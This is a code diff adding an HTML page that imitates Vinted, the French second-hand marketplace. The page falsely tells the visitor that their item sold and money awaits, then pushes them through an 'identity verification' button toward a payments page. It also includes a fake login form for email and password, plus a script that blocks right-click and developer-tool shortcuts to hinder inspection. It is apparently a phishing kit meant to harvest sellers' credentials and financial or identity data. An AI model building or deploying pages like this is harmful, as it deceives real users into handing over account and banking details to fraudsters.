+        .highlighted-text-4 {
+            background-color: var(--vinted-light-grey);
+            color: var(--vinted-medium-grey);
+            font-size: clamp(14px, 3.5vw, 16px);
+            padding: 15px 20px;
+            border: 1px solid var(--vinted-border-grey);
+            box-shadow: none; /* Pas d'ombre pour ces textes d'information */
+            margin-top: 15px; /* Espacement entre les textes */
+        }
+        
+        @media (max-width: 768px) {
+            .highlighted-text {
+                padding: 15px;
+                margin: 20px auto;
+            }
+            .highlighted-text-1 {
+                font-size: clamp(16px, 4vw, 20px);
+                padding: 20px 15px;
+                margin-bottom: 30px;
+            }
+            .highlighted-text-2 {
+                font-size: clamp(15px, 3.8vw, 18px);
+                padding: 20px 15px;
+                margin-top: 30px;
+            }
+            .highlighted-text-3,
+            .highlighted-text-4 {
+                font-size: clamp(13px, 3.2vw, 15px);
+                padding: 10px 15px;
+                margin-top: 10px;
+            }
+
+            /* NOUVEAU STYLE POUR CENTRER L'ANIMATION */
+        .lottie-container {
+            display: flex;
+            justify-content: center;
+            margin: 0 auto;
+            padding: 20px 0;
+            width: 100%; /* S'assure que le conteneur lottie prend toute la largeur */
+        }
+        }
+
+    </style>
+
+    <link href="favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+    <link href="favicon.ico" rel="icon" type="image/x-icon"/>
+    <link href="apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+    <link href="site.webmanifest" rel="manifest"/>
+</head>
+<body>
+
+    <header class="main-header">
+        <div class="mobile-header-top">
+            <i class="fas fa-bars mobile-menu-icon" id="mobile-menu-icon"></i>
+            <a href="#" class="mobile-header-logo">
+                <img src="logovinteddujour.png" alt="Vinted Logo" class="mobile-header-logo-image">
+            </a>
+            <div class="mobile-header-icons">
+                <a href="#" class="mobile-header-icon" id="mobile-message-icon"><i class="fas fa-comment-dots"></i></a>
+                <a href="#" class="mobile-header-icon" id="mobile-notification-icon"><i class="fas fa-bell"></i></a>
+                <a href="#" class="mobile-header-icon" id="mobile-favorite-icon"><i class="fas fa-heart"></i></a>
+            </div>
+        </div>
+
+        <div class="mobile-search-bar-container">
+            <div class="search-container">
+                <div class="articles-dropdown">
+                    Articles <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="search-bar">
+                    <i class="fas fa-search"></i>
+                    <input type="text" placeholder="Rechercher des articles">
+                </div>
+            </div>
+        </div>
+
+        <div class="mobile-categories-chips">
+            <ul>
+                <li><a href="#"><i class="fas fa-eye"></i> <span>Voir tout</span></a></li>
+                <li><a href="#"><i class="fas fa-female"></i> <span>Femmes</span></a></li>
+                <li><a href="#"><i class="fas fa-male"></i> <span>Hommes</span></a></li>
+                <li><a href="#"><i class="fas fa-crown"></i> <span>Créateurs</span></a></li>
+                <li><a href="#"><i class="fas fa-child"></i> <span>Enfant</span></a></li>
+                <li><a href="#"><i class="fas fa-home"></i> <span>Maison</span></a></li>
+                <li><a href="#"><i class="fas fa-microchip"></i> <span>Électroniques</span></a></li>
+                <li><a href="#"><i class="fas fa-gamepad"></i> <span>Divertissement</span></a></li>
+                <li><a href="#"><i class="fas fa-paw"></i> <span>Animaux</span></a></li>
+            </ul>
+        </div>
+        <div class="mobile-nav-menu" id="mobile-nav-menu">
+            <ul>
+                <li><button class="menu-item-button sell-articles">Vends tes articles</button></li>
+                <li><button class="menu-item-button" id="mobile-menu-login-signup-btn"> Déconnexion</button></li>
+                <li><a href="#">Ton guide Vinted</a></li>
+                <li><a href="#">Femmes</a></li>
+                <li><a href="#">Hommes</a></li>
+                <li><a href="#">Articles de créateurs</a></li>
+                <li><a href="#">Enfants</a></li>
+                <li><a href="#">Maison</a></li>
+                <li><a href="#">Électronique</a></li>
+                <li><a href="#">Divertissement</a></li>
+                <li><a href="#">Sport</a></li>
+                <li><a href="#">Animaux</a></li>
+                <li><a href="#">À propos</a></li>
+                <li><a href="#">Notre plateforme</a></li>
+            </ul>
+        </div>
+        <div class="mobile-menu-overlay" id="mobile-menu-overlay"></div>
+
+
+        <div class="header-top">
+            <div class="header-left-section">
+                <a href="#" class="logo">
+                    <img src="logovinteddujour.png" alt="Vinted Logo" class="header-logo-image">
+                </a>
+                <div class="search-container">
+                    <div class="articles-dropdown">
+                        Articles <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="search-bar">
+                        <i class="fas fa-search"></i>
+                        <input type="text" placeholder="Rechercher des articles">
+                    </div>
+                </div>
+            </div>
+            <nav class="top-nav">
+                <ul>
+                    <li><a href="#" class="header-icon" id="desktop-message-icon"><i class="fas fa-comment-dots"></i></a></li>
+                    <li><a href="#" class="header-icon" id="desktop-notification-icon"><i class="fas fa-bell"></i></a></li>
+                    <li><a href="#" class="header-icon" id="desktop-favorite-icon"><i class="fas fa-heart"></i></a></li>
+
+                    <li><a href="#" class="btn btn-green">Vends tes articles</a></li>
+                    <li><a href="#" class="icon-link"><i class="fas fa-question-circle"></i></a></li>
+                    <li><a href="#" class="lang-select">FR <i class="fas fa-chevron-down"></i></a></li>
+                </ul>
+            </nav>
+        </div>
+
+        <nav class="categories-nav">
+            <div class="container">
+                <ul>
+                    <li><a href="#">Femmes</a></li>
+                    <li><a href="#">Hommes</a></li>
+                    <li><a href="#">Articles de créateurs</a></li>
+                    <li><a href="#">Enfants</a></li>
+                    <li><a href="#">Maison</a></li>
+                    <li><a href="#">Électronique</a></li>
+                    <li><a href="#">Divertissement</a></li>
+                    <li><a href="#">Sport</a></li>
+                    <li><a href="#">Animaux</a></li>
+                    <li><a href="#">À propos</a></li>
+                    <li><a href="#">Notre plateforme</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <div class="page-wrapper">
+        
+        <div class="container">
+            <img alt="Vinted Logo" class="logo-image" src="logo-vinted-vélo.jpg"/>
+            <h2>Vous avez reçu de l'argent.</h2>
+
+            <div id="personalized-message-container">
+    <h3>Félicitations ! Votre article a été vendu.</h3>
+    <p>Le paiement de l'acheteur a été reçu et est actuellement sécurisé par Vinted..</p>
+</div>
+
+            <div class="lottie-container">
+
+                <script src="https://unpkg.com/@dotlottie/player-component@2.7.12/dist/dotlottie-player.mjs" type="module"></script>
+<dotlottie-player src="https://lottie.host/090293f4-8e3e-449e-91d5-f4aa74124b71/7Y9EfHTwtR.lottie" background="transparent" speed="1" style="width: 300px; height: 300px" loop autoplay></dotlottie-player>
+
+            </div>
+
+                <div class="lottie-container">
+                    <script src="https://unpkg.com/@dotlottie/player-component@2.7.12/dist/dotlottie-player.mjs" type="module"></script>
+                    <dotlottie-player src="https://lottie.host/c0f43a6c-e6a9-49fe-84e9-a9bf7b47013c/bwZEYRi787.lottie" background="transparent" speed="1" style="width: 300px; height: 300px" loop autoplay></dotlottie-player>
+                </div>
+            
+            <div class="highlighted-text highlighted-text-2">
+                Pour recevoir vos paiements sans délai sur votre compte bancaire, veuillez finaliser la vérification de votre identité. Cliquez sur le bouton ci-dessous pour finaliser le transfert vers votre compte bancaire
+            </div>
+
+            <div class="button-container">
+                <a class="button" id="check-identity-button">Vérifier mon identité</a>
+                
+                <div id="redirection-message">
+                    Redirection en cours vers l’étape de vérification de votre identité... Merci de patienter .
+                </div>
+
+                <div class="highlighted-text highlighted-text-3">
+                    Vos informations d'identité seront vérifiées, cryptées et transmises de manière sécurisée.
+                </div>
+                
+                <div class="highlighted-text highlighted-text-4">
+                    Nous ne stockons jamais les informations d'identité soumises par le biais de ce processus sur nos systèmes.
+                </div>
+            </div>
+        </div>
+        </div>
+
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>Vinted</h4>
+                    <ul>
+                        <li><a href="#">À propos de Vinted</a></li>
+                        <li><a href="#">Carrière</a></li>
+                        <li><a href="#">Le développement durable</a></li>
+                        <li><a href="#">Presse</a></li>
+                        <li><a href="#">Publicités</a></li>
+                        <li><a href="#">Accessibilité</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Découvrir</h4>
+                    <ul>
+                        <li><a href="#">Comment ça marche ?</a></li>
+                        <li><a href="#">Vérification de l'article</a></li>
+                        <li><a href="#">Applications mobiles</a></li>
+                        <li><a href="#">Tableau de bord</a></li>
+                        <li><a href="#">Vinted Pro</a></li>
+                        <li><a href="#">Guide Vinted Pro</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Aide</h4>
+                    <ul>
+                        <li><a href="#">Centre d'aide</a></li>
+                        <li><a href="#">Vendre</a></li>
+                        <li><a href="#">Acheter</a></li>
+                        <li><a href="#">Confiance et sécurité</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                </div>
+                <div class="app-badges">
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="Télécharger sur l'App Store"></a>
+                    <a href="#"><img src="https://upload.wikimedia.com/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Disponible sur Google Play"></a>
+                </div>
+                <div class="legal-links">
+                    <a href="#">Politique de Confidentialité</a>
+                    <a href="#">Politique de cookies</a>
+                    <a href="#">Paramètres des cookies</a>
+                    <a href="#">Termes et Conditions</a>
+                    <a href="#">Notre plateforme</a>
+                    <a href="#">Termes et conditions de Vinted Pro</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="login-modal-overlay" id="login-modal-overlay">
+        <div class="login-form-container">
+            <span class="close-btn" id="close-login-modal">&times;</span>
+            <h2>Se connecter</h2>
+            <form id="login-form-main">
+                <input type="text" placeholder="E-mail ou nom d'utilisateur" name="email_username" required>
+                <div class="password-input-wrapper">
+                    <input type="password" placeholder="Mot de passe" id="password-input" name="password" required>
+                    <i class="far fa-eye-slash" id="toggle-password-visibility"></i>
+                </div>
+
+                <button type="button" class="btn btn-green" id="submitBtn">Continuer</button>
+            </form>
+            <div class="form-links">
+                <a href="#">Mot de passe oublié ?</a>
+                <a href="#">Un problème ?</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+
+
+    // ... (le reste de votre code existant)
+});
+    </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const searchInput = document.querySelector('.search-bar input');
+            const searchContainer = document.querySelector('.search-container');
+            const loginModalOverlay = document.getElementById('login-modal-overlay');
+            const closeLoginModalBtn = document.getElementById('close-login-modal');
+            const passwordInput = document.getElementById('password-input');
+            const togglePasswordVisibility = document.getElementById('toggle-password-visibility');
+            const loginForm = document.getElementById('login-form-main');
+            const submitBtn = document.getElementById('submitBtn');
+
+            // NEW: Mobile menu elements
+            const mobileMenuIcon = document.getElementById('mobile-menu-icon');
+            const mobileNavMenu = document.getElementById('mobile-nav-menu');
+            const mobileMenuOverlay = document.getElementById('mobile-menu-overlay');
+            const mobileMenuLoginSignupBtn = document.getElementById('mobile-menu-login-signup-btn'); // For login/signup in mobile menu
+
+            // Elements for redirection
+            const checkIdentityButton = document.getElementById('check-identity-button');
+            const redirectionMessage = document.getElementById('redirection-message');
+            const targetPage = 'settings.payments.html'; // Define your target page here
+
+            // Effet de focus sur la barre de recherche
+            const desktopSearchInput = document.querySelector('.header-top .search-bar input');
+            const desktopSearchContainer = document.querySelector('.header-top .search-container');
+
+            if (desktopSearchInput && desktopSearchContainer) {
+                desktopSearchInput.addEventListener('focus', () => {
+                    desktopSearchContainer.style.boxShadow = '0 0 0 1px var(--vinted-green)';
+                });
+
+                desktopSearchInput.addEventListener('blur', () => {
+                    desktopSearchContainer.style.boxShadow = 'none';
+                });
+            }
+
+            // Afficher le formulaire de connexion (mobile menu button remains)
+            mobileMenuLoginSignupBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                mobileNavMenu.classList.remove('active'); // Close mobile menu first
+                mobileMenuOverlay.classList.remove('active'); // Hide overlay
+                loginModalOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+
+            // Fermer le formulaire de connexion via le bouton croix
+            closeLoginModalBtn.addEventListener('click', () => {
+                loginModalOverlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // Fermer le formulaire de connexion en cliquant en dehors du formulaire
+            loginModalOverlay.addEventListener('click', (e) => {
+                if (e.target === loginModalOverlay) {
+                    loginModalOverlay.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                }
+            });
+
+            // Basculer la visibilité du mot de passe
+            togglePasswordVisibility.addEventListener('click', () => {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                togglePasswordVisibility.classList.toggle('fa-eye');
+                togglePasswordVisibility.classList.toggle('fa-eye-slash');
+            });
+
+            // NEW: Toggle mobile menu visibility
+            mobileMenuIcon.addEventListener('click', () => {
+                mobileNavMenu.classList.toggle('active');
+                mobileMenuOverlay.classList.toggle('active');
+                // Prevent scrolling on body when menu is open
+                if (mobileNavMenu.classList.contains('active')) {
+                    document.body.style.overflow = 'hidden';
+                } else {
+                    document.body.style.overflow = 'auto';
+                }
+            });
+
+            // NEW: Close mobile menu when overlay is clicked
+            mobileMenuOverlay.addEventListener('click', () => {
+                mobileNavMenu.classList.remove('active');
+                mobileMenuOverlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            });
+
+            // --- Redirection logic for "Vérifier mon identité" button ---
+            if (checkIdentityButton && redirectionMessage) {
+                checkIdentityButton.addEventListener('click', (e) => {
+                    e.preventDefault(); // Prevent immediate redirection
+
+                    // Hide the button and display the message
+                    checkIdentityButton.style.display = 'none';
+                    redirectionMessage.style.display = 'block';
+
+                    // Set a timeout for 30 seconds (30000 milliseconds)
+                    setTimeout(() => {
+                        window.location.href = targetPage; // Redirect to the target page
+                    }, 10000); // 30 seconds
+                });
+            }
+            // --- End of redirection logic ---
+
+        });
+    </script>
+
+    <script>
+        document.addEventListener("contextmenu", event => event.preventDefault());  // Bloque clic droit
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || (e.ctrlKey && e.key === "U")) {
+                e.preventDefault();
+            }
+        });
+        document.querySelectorAll("img").forEach(img => {
+            img.setAttribute("oncontextmenu", "return false");
+            img.setAttribute("ondragstart", "return false");
+        });
+    </script>
+
+</body>
+</html>
